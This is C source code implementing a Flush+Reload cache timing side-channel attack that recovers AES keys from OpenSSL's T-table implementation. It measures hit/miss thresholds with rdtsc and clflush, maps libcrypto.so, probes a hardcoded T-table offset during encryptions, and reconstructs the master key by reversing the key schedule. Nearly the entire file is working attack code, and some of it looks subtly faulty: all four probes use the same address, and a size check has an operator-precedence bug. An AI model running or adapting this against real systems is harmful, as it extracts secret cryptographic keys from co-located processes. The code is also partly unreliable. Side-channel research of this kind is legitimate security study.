/*

 This code is finished by Shaowen Sun, partical of it from Yarom et al., this code is a implementation of Flush and Reload Cache Side Channel Attack. The objective for this code is OpenSSL's AES T-table.


This code includes serval partial implemention, by change the structure of code and connect with each other.


*/

#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <openssl/aes.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <map>
#include <vector>
#include <string.h>
#include <sched.h>


#define CACHEUTILS_H

#define MAX(X,Y) (((X) > (Y)) ? (X) : (Y))
#define MIN(X,Y) (((X) < (Y)) ? (X) : (Y))

unsigned long long rdtsc() {
        unsigned long long a, d;
        asm volatile ("mfence");
        asm volatile ("rdtsc" : "=a" (a), "=d" (d));
        a = (d << 32) | a;
        asm volatile ("mfence");
        return a;
}

void memory_access(void* p)
{
  asm volatile ("movq (%0), %%rax\n"
    :
    : "c" (p)
    : "rax");
}

void flush(void* p) {
    asm volatile ("clflush 0(%0)\n"
      :
      : "c" (p)
      : "rax");
}


size_t array [ 5 * 1024 ];

size_t cache_hit[ 80 ];
size_t cache_miss[ 80 ];

size_t reloads(void* location)
{
  size_t t = rdtsc();
  memory_access(location);
  size_t alpha = rdtsc() - t;
  return alpha;
}

size_t flushes_reloads(void* location)
{
  size_t t = rdtsc();
  memory_access(location);
  size_t alpha = rdtsc() - t;
  flush(location);
  return alpha;
}


// more encryptions show features more clearly
#define ENCRYPTION_NUMBER (40000)

static const uint8_t sandbox[256] = 
{
  //0     1    2      3     4    5     6     7      8    9     A      B    C     D     E     F
  0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
  0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
  0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
  0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
  0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
  0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
  0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
  0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
  0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
  0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
  0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
  0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
  0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
  0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
  0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
  0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16 
};

unsigned char key[] =
{
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

size_t total;
size_t cs;

char* root;
char* exits;

int elements(double *arr, int N, int *attack, int n) 
{
  /*
     insert into attack[0],...,attack[n-1] the indices of n smallest elements 
     of arr[0],...,arr[N-1]
  */
  int attack_count = 0;
  int i;
  for ( i = 0; i < N; ++i ) 
   {
    int k;
    for ( k = attack_count; k > 0 && arr[i]< arr[ attack[k-1] ]; k--);
    if ( k >= n ) continue; 
    int j = attack_count;
    if ( j > n - 1 ) 
    { 
      j = n - 1;
    } else 
    { 
      attack_count ++;
    }
    for ( ; j > k; j--) 
    {
      attack[j]=attack[ j - 1 ];
    }
    attack[k] = i;
  }
  return attack_count;
}

uint32_t sub_string_set(uint32_t string) {
  uint32_t result = 0;

  uint8_t t1 = sandbox[(string >> 24) & 0x000000ff];
  uint8_t t2 = sandbox[(string >> 16) & 0x000000ff];
  uint8_t t3 = sandbox[(string >> 8 ) & 0x000000ff];
  uint8_t t4 = sandbox[(string      ) & 0x000000ff];

  result = (t1 << 24) ^ (t2 << 16) ^ (t3 << 8) ^ t4;

  return result;
}


int init()
{
  memset( array , -1 , 5 * 1024 * sizeof(size_t) );
  memory_access( array + 2 * 1024 );
  sched_yield();

  for ( int i = 0; i < 4 * 1024 * 1024; ++i)
  {
    size_t d = reloads(array+2*1024);
    cache_hit[ MIN( 79 , d / 5 ) ]++;
    sched_yield();
  }

  flush( array + 1024 );

  for ( int i = 0; i < 4 * 1024 * 1024; ++i)
  {
    size_t d = flushes_reloads( array + 2 * 1024 );
    cache_miss[ MIN( 79, d / 5 ) ]++;
    sched_yield();
  }

  printf("...\n");
  size_t MH = 0;
  size_t MH_i = 0;
  size_t smallest_miss_i = 0;

  for (int i = 0; i < 80; ++i)
  {
    if ( MH < cache_hit[i] )
    {
      MH = cache_hit[ i ];
      MH_i = i;
    }

    if (cache_miss[ i ] > 3 && smallest_miss_i == 0)
      smallest_miss_i = i;
  }

  if (smallest_miss_i > MH_i + 4)
    printf("Flush+Reload possible!\n");

  else if (smallest_miss_i > MH_i + 2)
    printf("Flush+Reload probably possible!\n");

  else if (smallest_miss_i < MH_i + 2)
    printf("Flush+Reload maybe not possible!\n");

  else
    printf("Flush+Reload not possible!\n");

  size_t min = -1UL;
  size_t min_i = 0;

  for (int i = MH_i; i < smallest_miss_i; ++i)
  {

    if (min > (cache_hit[i] + cache_miss[i]))
    {
      min = cache_hit[i] + cache_miss[i];
      min_i = i;
    }
  }

  printf("Cache hit/miss threshold will be: %zu\n", min_i * 5);
  return min_i * 5;
}


int main()
{
  printf("Initalizing...");
  int CACHE_MISS_CYCLE_NUMBER = init();
  int file = open("/usr/local/lib/libcrypto.so", O_RDONLY);
  size_t size = lseek(file, 0, SEEK_END);
  if (size == 0)
    exit(-1);
  size_t map_size = size;
  if (map_size & 0xFFF != 0)
  {
    map_size |= 0xFFF;
    map_size += 1;
  }
  root = (char*) mmap(0, map_size, PROT_READ, MAP_SHARED, file, 0);
  exits = root + size;

  unsigned char text[] =
  {
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
  };
  unsigned char encryption_content[128];
  unsigned char restoredtext[128];
  int counters[16][256];
  int misses[16][256];
  int encryption_num[16][256];
  double MR[16][256];
  int possible_round_key[16];

  for (int i=0; i<16; i++) {
    for (int j=0; j<256; j++) {
      encryption_num[i][j] = 0;
      misses[i][j] = 0;
      counters[i][j] = 0;
    }
  }

  AES_KEY key_struct;

  AES_set_encrypt_key(key, 128, &key_struct);

  uint64_t minimum_t = rdtsc();
  srand(minimum_t);
  total = 0;
  char* probes[] = { 
   //    root + 0x1b9280, root + 0x1b9680, base + 0x1b9a80, base + 0x1b9e80
       root + 0x1d34e0, root + 0x1d34e0, root + 0x1d34e0, root + 0x1d34e0
  };

  // encryptions for Te0
  for (int i = 0; i < ENCRYPTION_NUMBER; ++i)
  {
    for (size_t j = 0; j < 16; ++j)
      text[j] = rand() % 256;
    flush(probes[0]);
    AES_encrypt(text, encryption_content, &key_struct);
    size_t t = rdtsc();
    memory_access(probes[0]);
    size_t alpha = rdtsc() - t;
    encryption_num[2][(int) encryption_content[2]]++;
    encryption_num[6][(int) encryption_content[6]]++;
    encryption_num[10][(int) encryption_content[10]]++;
    encryption_num[14][(int) encryption_content[14]]++;
    if (alpha > CACHE_MISS_CYCLE_NUMBER) {
      misses[2][(int) encryption_content[2]]++;
      misses[6][(int) encryption_content[6]]++;
      misses[10][(int) encryption_content[10]]++;
      misses[14][(int) encryption_content[14]]++;
    }
  }

  // encryptions for Te1
  for (int i = 0; i < ENCRYPTION_NUMBER; ++i)
  {
    for (size_t j = 0; j < 16; ++j)
      text[j] = rand() % 256;
    flush(probes[1]);
    AES_encrypt(text, encryption_content, &key_struct);
    size_t t = rdtsc();
    memory_access(probes[1]);
    size_t alpha = rdtsc() - t;
    encryption_num[3][(int) encryption_content[3]]++;
    encryption_num[7][(int) encryption_content[7]]++;
    encryption_num[11][(int) encryption_content[11]]++;
    encryption_num[15][(int) encryption_content[15]]++;
    if (alpha > CACHE_MISS_CYCLE_NUMBER) {
      misses[3][(int) encryption_content[3]]++;
      misses[7][(int) encryption_content[7]]++;
      misses[11][(int) encryption_content[11]]++;
      misses[15][(int) encryption_content[15]]++;
    }
  }

  // encryptions for Te2
  for (int i = 0; i < ENCRYPTION_NUMBER; ++i)
  {
    for (size_t j = 0; j < 16; ++j)
      text[j] = rand() % 256;

    flush(probes[2]);
    AES_encrypt(text, encryption_content, &key_struct);
    size_t t = rdtsc();
    memory_access(probes[2]);
    size_t alpha = rdtsc() - t;
    encryption_num[0][(int) encryption_content[0]]++;
    encryption_num[4][(int) encryption_content[4]]++;
    encryption_num[8][(int) encryption_content[8]]++;
    encryption_num[12][(int) encryption_content[12]]++;
    if (alpha > CACHE_MISS_CYCLE_NUMBER) 
    {
      misses[0][(int) encryption_content[0]]++;
      misses[4][(int) encryption_content[4]]++;
      misses[8][(int) encryption_content[8]]++;
      misses[12][(int) encryption_content[12]]++;
    }
  }

  // encryptions for Te3
  for (int i = 0; i < ENCRYPTION_NUMBER; ++i)
  {
    for (size_t j = 0; j < 16; ++j)
      text[j] = rand() % 256;
    flush(probes[3]);
    AES_encrypt(text, encryption_content, &key_struct);
    size_t t = rdtsc();
    memory_access(probes[3]);
    size_t alpha = rdtsc() - t;
    encryption_num[1][(int) encryption_content[1]]++;
    encryption_num[5][(int) encryption_content[5]]++;
    encryption_num[9][(int) encryption_content[9]]++;
    encryption_num[13][(int) encryption_content[13]]++;
    if (alpha > CACHE_MISS_CYCLE_NUMBER) {
      misses[1][(int) encryption_content[1]]++;
      misses[5][(int) encryption_content[5]]++;
      misses[9][(int) encryption_content[9]]++;
      misses[13][(int) encryption_content[13]]++;
    }
  }

  // calculate the cache miss rates 
  for (int i = 0; i < 16; i++) {
    for (int j = 0; j < 256; j++) {
      MR[i][j] = (double) misses[i][j] / encryption_num[i][j];
    }
  }

  int indices[16][16];
  // get the values of lowest missrates
  for (int i = 0; i < 16; i++) 
  {
    elements(MR[i], 256, indices[i], 16);
  }

  for (int i = 0; i < 16; i++) 
  {
    // loop through encryption_content bytes with lowest missrates
    for (int j = 0; j < 16; j++) 
    {
      counters[i][indices[i][j] ^ 99  ]++;
      counters[i][indices[i][j] ^ 124 ]++;
      counters[i][indices[i][j] ^ 119 ]++;
      counters[i][indices[i][j] ^ 123 ]++;
      counters[i][indices[i][j] ^ 242 ]++;
      counters[i][indices[i][j] ^ 107 ]++;
      counters[i][indices[i][j] ^ 111 ]++;
      counters[i][indices[i][j] ^ 197 ]++;
      counters[i][indices[i][j] ^ 48  ]++;
      counters[i][indices[i][j] ^ 1   ]++;
      counters[i][indices[i][j] ^ 103 ]++;
      counters[i][indices[i][j] ^ 43  ]++;
      counters[i][indices[i][j] ^ 254 ]++;
      counters[i][indices[i][j] ^ 215 ]++;
      counters[i][indices[i][j] ^ 171 ]++;
      counters[i][indices[i][j] ^ 118 ]++;
    }
  }

  // find the max value in countKeyCandidate...
  // this is our guess at the key byte for that ctext position
  for (int i = 0; i < 16; i++) 
  {
    int maximum_value = 0;
    int maximum_index;
    for (int j = 0; j < 256; j++) 
    {
      if (counters[i][j] > maximum_value) 
      {
        maximum_value = counters[i][j];
        maximum_index = j;
      }
    }
    // save in the guess array
    possible_round_key[i] = maximum_index;
  }

  // Algorithm to recover the master key from the last round key
  uint32_t round_key[4];
  round_key[3] =  (((uint32_t) possible_round_key[12]) << 24) ^
                  (((uint32_t) possible_round_key[13]) << 16) ^
                  (((uint32_t) possible_round_key[14]) << 8 ) ^
                  (((uint32_t) possible_round_key[15])      );

  round_key[2] =  (((uint32_t) possible_round_key[8] ) << 24) ^
                  (((uint32_t) possible_round_key[9] ) << 16) ^
                  (((uint32_t) possible_round_key[10]) << 8 ) ^
                  (((uint32_t) possible_round_key[11])      );

  round_key[1] =  (((uint32_t) possible_round_key[4] ) << 24) ^
                  (((uint32_t) possible_round_key[5] ) << 16) ^
                  (((uint32_t) possible_round_key[6] ) << 8 ) ^
                  (((uint32_t) possible_round_key[7] )      );

  round_key[0] =  (((uint32_t) possible_round_key[0] ) << 24) ^
                  (((uint32_t) possible_round_key[1] ) << 16) ^
                  (((uint32_t) possible_round_key[2] ) << 8 ) ^
                  (((uint32_t) possible_round_key[3] )      );

  uint32_t string4, string3, string2, string1;
  uint32_t rcon[10] = {0x36000000, 0x1b000000, 0x80000000, 0x40000000,
                       0x20000000, 0x10000000, 0x08000000, 0x04000000,
                       0x02000000, 0x01000000};

  // loop to backtrack aes key expansion
  for (int i=0; i<10; i++) {
    string4 = round_key[3] ^ round_key[2];
    string3 = round_key[2] ^ round_key[1];
    string2 = round_key[1] ^ round_key[0];

    uint32_t rotWord = (string4 << 8) ^ (string4 >> 24);

    string1 = (round_key[0] ^ rcon[i] ^ sub_string_set(rotWord));

    round_key[3] = string4;
    round_key[2] = string3;
    round_key[1] = string2;
    round_key[0] = string1;
  }

  for(int i=3; i>=0; i--) {
    printf("%x, ", round_key[i]);
  }
  printf("\n");

  close(file);
  munmap(root, map_size);
  fflush(stdout);
  return 0;
}

